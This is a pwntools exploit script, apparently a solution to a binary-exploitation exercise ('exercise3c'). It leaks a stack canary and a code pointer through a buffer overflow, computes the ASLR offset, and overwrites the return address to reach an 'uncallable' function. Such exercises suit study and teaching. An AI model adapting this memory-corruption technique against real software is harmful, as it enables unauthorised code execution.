#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise3c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    r = process([exe] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(r, gdbscript=gdbscript, *a, **kw)
        return r
    else:
        return r


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
e = ELF(exe)

#get the static addresses
main_static_address = e.symbols['main']
uncallable_static_address = e.symbols['uncallable']
print_hello_static_address = e.symbols['print_hello']

#print the information
log.info(hex(uncallable_static_address))
log.info(hex(print_hello_static_address))

size_buffer = 96

#send A's to overflow the buffer and that the printf function does not stop before this
#then we know that the next 4 bytes are the canary, which we save for the next round of the
#while loop
leak_exploit = b"A"*(size_buffer-1)
welcome = r.recvline()


#if str(start_msg)[2] != 'E':
#    r.recvline()
r.sendline(leak_exploit)
leak = r.recvuntil("\n")
canary = r.recv(4)
dynamic_address_PH = r.recv(6)
test = r.recvuntil("password:\n", timeout=1)

#calculate the offset
offset = int.from_bytes(dynamic_address_PH, 'little') - print_hello_static_address

#calculate the dynamic address of uncallable
dynam_uncallable_addr_int = uncallable_static_address + offset
dynam_uncallable_addr = dynam_uncallable_addr_int.to_bytes(8,'little')

padding = b'BBBB'*9

#construct the exploit and send it
exploit = leak_exploit  + b'A'+ canary + padding + dynam_uncallable_addr
r.sendline(exploit)
r.recvline()
output = r.recvall()
print(output)

